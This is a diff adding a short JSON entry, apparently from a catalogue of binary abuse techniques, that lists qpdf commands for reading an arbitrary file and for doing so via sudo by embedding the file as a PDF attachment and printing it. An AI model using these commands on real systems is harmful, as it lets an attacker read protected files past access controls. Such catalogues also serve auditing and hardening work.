@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "description": "",
+        "code": "qpdf --empty --add-attachment /path/filename -- out.pdf; qpdf out.pdf --show-attachment=filename\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo qpdf --empty --add-attachment /path/filename -- out.pdf; qpdf out.pdf --show-attachment=filename\n"
+      }
+    ]
+  }
+}
